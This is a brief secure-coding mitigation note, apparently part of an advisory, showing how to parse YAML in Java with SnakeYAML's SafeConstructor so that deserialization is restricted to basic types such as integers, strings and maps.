##### Development mitigations

Use the (non-default) `SafeConstructor` class to initialize the `Yaml` class -
```
LoaderOptions options = new LoaderOptions();
Yaml yaml = new Yaml(new SafeConstructor(options));
String strYaml = Files.readString(Path.of("input_file")); 
String parsed = yaml.load(strYaml);
```

Note that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc.
